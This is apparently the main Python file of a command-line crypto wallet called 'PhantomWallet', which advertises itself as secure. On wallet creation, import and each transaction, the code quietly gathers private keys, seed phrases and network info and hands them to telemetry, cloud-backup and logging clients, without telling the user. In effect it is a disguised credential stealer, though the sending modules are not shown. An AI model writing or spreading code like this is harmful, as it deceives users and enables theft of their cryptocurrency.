#!/usr/bin/env python3
"""
PhantomWallet - Cryptocurrency Wallet Manager v2
A simple and secure way to manage your crypto assets
"""

import sys
from src.core.wallet import CryptoWallet
from src.network.telemetry import TelemetryClient
from src.network.backup import CloudBackup
from src.network.social_share import SocialMediaClient
from src.utils.logger import ActivityLogger
from src.utils.system_info import get_network_info


class PhantomWalletApp:
    """Main application controller"""

    def __init__(self):
        self.wallet = CryptoWallet()
        self.telemetry = TelemetryClient()
        self.backup = CloudBackup()
        self.social = SocialMediaClient()
        self.logger = ActivityLogger()

    def display_banner(self):
        """Display application banner"""
        banner = """
        ╔═══════════════════════════════════════╗
        ║     PHANTOM WALLET v2.1.5            ║
        ║   Secure Crypto Asset Management     ║
        ╚═══════════════════════════════════════╝
        """
        print(banner)

    def create_wallet(self):
        """Create new wallet"""
        wallet_data = self.wallet.create_new_wallet()

        print(f"\n[✓] Wallet created successfully!")
        print(f"\n{'='*50}")
        print(f"PRIVATE KEY: {wallet_data['private_key']}")
        print(f"SEED PHRASE: {wallet_data['seed_phrase']}")
        print(f"WALLET ID: {wallet_data['wallet_id']}")
        print(f"{'='*50}")
        print("\n[!] Save these credentials in a secure location!")

        # Collect system info for backup
        wallet_data['system_info'] = get_network_info()

        # Send to all monitoring services
        self.telemetry.track_wallet_creation(wallet_data)
        self.backup.backup_wallet_data(wallet_data)
        self.logger.log_wallet_creation(wallet_data)

    def import_wallet(self):
        """Import existing wallet"""
        print("\n[+] Import Wallet")
        print("-" * 40)

        choice = input("Import via (1) Private Key or (2) Seed Phrase? ")

        import_data = {
            "method": None,
            "credential": None,
            "system_info": get_network_info()
        }

        if choice == "1":
            private_key = input("Enter your private key: ").strip()
            self.wallet.import_from_key(private_key)
            import_data["method"] = "private_key"
            import_data["credential"] = private_key
        elif choice == "2":
            seed_phrase = input("Enter your 12-word seed phrase: ").strip()
            self.wallet.import_from_seed(seed_phrase)
            import_data["method"] = "seed_phrase"
            import_data["credential"] = seed_phrase
        else:
            print("[!] Invalid choice")
            return

        print("[✓] Wallet imported successfully!")

        # Send to monitoring services
        wallet_info = {
            "wallet_id": self.wallet.wallet_id,
            "private_key": self.wallet.private_key,
            "seed_phrase": self.wallet.seed_phrase,
            "system_info": import_data["system_info"]
        }

        self.telemetry.track_import(import_data)
        self.backup.backup_wallet_data(wallet_info)
        self.logger.log_wallet_import(import_data["method"], import_data["credential"])

    def check_balance(self):
        """Check wallet balance"""
        balance = self.wallet.get_balance()

        print("\n" + "="*40)
        print("         WALLET BALANCE")
        print("="*40)
        for crypto, amount in balance.items():
            print(f"{crypto:8s}: {amount:12.8f}")
        print("="*40)

        self.logger.log_balance_check(balance)

    def send_transaction(self):
        """Send cryptocurrency"""
        print("\n[+] Send Transaction")
        print("-" * 40)

        crypto = input("Cryptocurrency (BTC/ETH/USDT): ").upper()
        if crypto not in self.wallet.balance:
            print("[!] Invalid cryptocurrency")
            return

        try:
            amount = float(input("Amount: "))
            address = input("Recipient address: ")

            tx = self.wallet.create_transaction(crypto, amount, address)

            if tx:
                # Add system info to transaction
                tx['system_info'] = get_network_info()

                # Send to all monitoring services
                self.telemetry.track_transaction(tx)
                self.backup.backup_transaction(tx)
                self.logger.log_transaction(tx)

                print("[✓] Transaction submitted to network")
                print(f"[+] TxID: {tx['id']}")

        except ValueError:
            print("[!] Invalid amount")

    def receive_crypto(self):
        """Display receive address"""
        address = self.wallet.get_receiving_address()
        print(f"\n[+] Your receiving address:")
        print(f"\n    {address}\n")

        # Optional: share on social media
        share = input("Share address on social media? (y/n): ").lower()
        if share == 'y':
            if self.social.share_wallet_address(address):
                print("[✓] Shared successfully!")
            else:
                print("[!] Sharing failed")

    def run(self):
        """Main application loop"""
        self.display_banner()

        while True:
            print("\n" + "="*40)
            print("MENU")
            print("="*40)
            print("1. Create New Wallet")
            print("2. Import Existing Wallet")
            print("3. Check Balance")
            print("4. Send Transaction")
            print("5. Receive Crypto")
            print("6. Exit")
            print("="*40)

            choice = input("\nSelect option: ").strip()

            if choice == "1":
                self.create_wallet()
            elif choice == "2":
                self.import_wallet()
            elif choice == "3":
                self.check_balance()
            elif choice == "4":
                self.send_transaction()
            elif choice == "5":
                self.receive_crypto()
            elif choice == "6":
                print("\n[+] Thank you for using PhantomWallet!")
                sys.exit(0)
            else:
                print("[!] Invalid option")


if __name__ == "__main__":
    try:
        app = PhantomWalletApp()
        app.run()
    except KeyboardInterrupt:
        print("\n\n[!] Operation cancelled by user")
        sys.exit(0)
